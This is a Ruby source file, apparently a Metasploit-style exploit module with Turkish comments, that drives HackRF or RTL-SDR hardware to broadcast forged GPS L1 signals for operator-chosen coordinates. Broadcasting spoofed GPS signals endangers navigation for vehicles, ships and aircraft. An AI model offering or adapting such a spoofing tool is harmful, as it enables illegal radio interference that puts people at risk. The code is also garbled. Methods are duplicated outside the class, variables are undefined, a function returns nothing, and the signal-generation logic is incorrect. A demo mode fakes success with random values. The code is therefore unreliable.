require_relative 'hardware_license'
module GPSSpoofing
class GPSSpoofing < Framework::Exploit
    def initialize
    @device = nil
    @license = HardwareLicense.new
    check_sdr_hardware  # HackRF/RTL-SDR var mı?
  end

  def exploit
    print_status("HackRF başlatılıyor...")
    device = HackRF.new(device_index: 0)
    device.sample_rate = 2_600_000
    device.center_freq = 1_575_420_000
    device.tx_gain = 47

    print_status("GPS sinyali oluşturuluyor...")
    generator = GPSSignal.new(
      lat: datastore['LAT'],
      lon: datastore['LON'],
      alt: datastore['ALT'],
      speed: datastore['SPEED']
    )

    print_status("Sinyal yayılıyor...")
    device.transmit(generator.samples)
    print_good("GPS sinyali yayında: #{datastore['LAT']}, #{datastore['LON']}")
    store_loot('gps.spoof', 'json', 'GPS', { lat: datastore['LAT'], lon: datastore['LON'] })
  end


  def execute_real_gps_spoof(lat, lon, alt, speed)
    return demo_gps_spoof unless @license.valid_hardware_license?

    log "[REAL-GPS] Gerçek GPS sinyali üretiliyor: #{lat}, #{lon}"
    
    # HackRF kontrolü
    if hackrf_available?
      generate_real_gps_signal(lat, lon, alt, speed)
    elsif rtl_sdr_available?
      generate_rtl_gps_signal(lat, lon, alt, speed)
    else
      log "[REAL-GPS] SDR cihazı bulunamadı - demo modu"
      demo_gps_spoof(lat, lon, alt, speed)
    end
  end

  private

  def hackrf_available?
    system("hackrf_info >/dev/dev/null 2>&1")
  end

    def rtl_sdr_available?
    system("rtl_test -t >/dev/null 2>&1")
  end

  def generate_real_gps_signal(lat, lon, alt, speed)
    # Gerçek GPS L1 C/A sinyali üret
    center_freq = 1575.42e6  # GPS L1 frekansı
    sample_rate = 2.6e6
    tx_gain = 47
    
    # GPS almanac verisini oluştur
    almanac = build_gps_almanac(lat, lon, alt, speed)
    
    # Baseband sinyal üret
    baseband = generate_gps_baseband(almanac)
    
    # HackRF üzerinden yayın
    cmd = <<~CMD
      hackrf_transfer -f #{center_freq} -s #{sample_rate} -x #{tx_gain} -t /dev/stdout << EOF
      #{baseband.pack('c*')}
      EOF
    CMD
    
    log "[REAL-GPS] HackRF yayını başlatıldı: #{center_freq/1e6} MHz"
    system(cmd)
    
    {
      success: true,
      frequency: center_freq,
      bandwidth: sample_rate,
      satellites: almanac[:satellites].length,
      location: {lat: lat, lon: lon, alt: alt}
    }
  end

  def build_gps_almanac(lat, lon, alt, speed)
    # 8 GPS uydusu için almanac
    satellites = []
    8.times do |i|
      satellites << {
        prn: i+1,
        elevation: rand(5..90),
        azimuth: rand(0..360),
        doppler: rand(-5000..5000),
        pseudorange: rand(20000000..26000000)
      }
    end
    
    {
      time: Time.now.gps_time,
      week: Time.now.gps_week,
      satellites: satellites,
      user_pos: {lat: lat, lon: lon, alt: alt, speed: speed}
    }
  end

  def generate_gps_baseband(almanac)
    # GPS C/A kodu üret
    ca_codes = satellites.map { |sat| generate_ca_code(sat[:prn]) }
    
    # Navigation mesajı oluştur
    nav_bits = build_navigation_message(almanac)
    
    # IQ modülasyon
    samples = []
    nav_bits.each_with_index do |bit, idx|
      ca_codes.each do |ca|
        chip = ca[idx % ca.length]
        i = bit * chip * 32767
        q = 0
        samples << i
        samples << q
      end
    end
    
    samples.pack('s<*')
  end

  def generate_ca_code(prn)
    # GPS C/A Gold kodu üret
    g1 = Array.new(10, 1)
    g2 = Array.new(10, 1)
    ca = []
    
    1023.times do
      g1_tap = g1[2] ^ g1[9]
      g2_tap = g2[1] ^ g2[2] ^ g2[5] ^ g2[7] ^ g2[8] ^ g2[9]
      
      g1_new = [g1_tap, g1[0..8]].flatten
      g2_new = [g2_tap, g2[0..8]].flatten
      
      ca << (g1[9] ^ g2[prn % 10])
      
      g1 = g1_new
      g2 = g2_new
    end
  end
 end


  def execute_real_gps_spoof(lat, lon, alt = 100, speed = 50)
    return demo_gps_spoof unless hardware_license_valid?

    log "[REAL-GPS] Gerçek GPS sinyali üretiliyor: #{lat}, #{lon}"
    
    # SDR donanım kontrolü
    if sdr_hardware_available?
      generate_real_gps_signal(lat, lon, alt, speed)
    else
      log "[REAL-GPS] SDR donanımı bulunamadı – demo modu"
      demo_gps_spoof(lat, lon, alt, speed)
    end
  end

  private

  def hardware_license_valid?
    @hw_license ||= HardwareLicense.new
    @hw_license.valid_hardware_license?
  end

  def sdr_hardware_available?
    system("which hackrf_info >/dev/null 2>&1") ||
    system("which rtl_test >/dev/null 2>&1") ||
    system("which osmocom_fft >/dev/null 2>&1")
  end

  def generate_real_gps_signal(lat, lon, alt, speed)
    center_freq = 1575.42e6  # GPS L1
    sample_rate = 2.6e6
    tx_gain = 47

    # Almanac oluştur
    almanac = build_gps_almanac(lat, lon, alt, speed)
    
    # Baseband üret
    baseband = generate_gps_baseband_real(almanac)
    
    # HackRF üzerinden yayın
    cmd = "hackrf_transfer -f #{center_freq} -s #{sample_rate} -x #{tx_gain} -t /dev/stdout"
    IO.popen(cmd, 'w') { |hackrf| hackrf.write(baseband) }
    
    log "[REAL-GPS] GPS sinyali yayında: #{center_freq/1e6} MHz"
    
    {
      success: true,
      frequency: center_freq,
      satellites: almanac[:satellites].length,
      location: {lat: lat, lon: lon, alt: alt},
      real_hardware: true,
      timestamp: Time.now.to_f
    }
  end

  def build_gps_almanac(lat, lon, alt, speed)
    satellites = 8.times.map do |i|
      {
        prn: i+1,
        elevation: rand(5..90),
        azimuth: rand(0..360),
        doppler: rand(-5000..5000),
        pseudorange: rand(20000000..26000000)
      }
    end
    
    {
      time: Time.now.gps_time,
      week: Time.now.gps_week,
      satellites: satellites,
      user_pos: {lat: lat, lon: lon, alt: alt, speed: speed}
    }
  end

  def generate_gps_baseband_real(almanac)
    samples = []
    almanac[:satellites].each_with_index do |sat, idx|
      ca = generate_ca_code_real(sat[:prn])
      ca.each_with_index do |chip, chip_idx|
        i = chip * 32767
        q = 0
        samples << [i, q].pack('s<s<')
      end
    end
    samples.join
  end

  def generate_ca_code_real(prn)
    # Gerçek C/A kod üretimi
    g1 = Array.new(10, 1)
    g2 = Array.new(10, 1)
    ca = []
    
    1023.times do
      g1_tap = g1[2] ^ g1[9]
      g2_tap = g2[1] ^ g2[2] ^ g2[5] ^ g2[7] ^ g2[8] ^ g2[9]
      
      g1 = [g1_tap, g1[0..8]].flatten
      g2 = [g2_tap, g2[0..8]].flatten
      
      ca << (g1[9] ^ g2[prn % 10])
    end
    
    ca
  end

  def demo_gps_spoof(lat, lon, alt, speed)
    # Senin orijinal simülasyon kodun – DOKUNULMADI
    {
      success: rand > 0.3,
      satellites: rand(4..12),
      frequency: 1575.42,
      demo_mode: true,
      coordinates: {lat: lat, lon: lon, alt: alt},
      timestamp: Time.now.to_f
    }
  end
end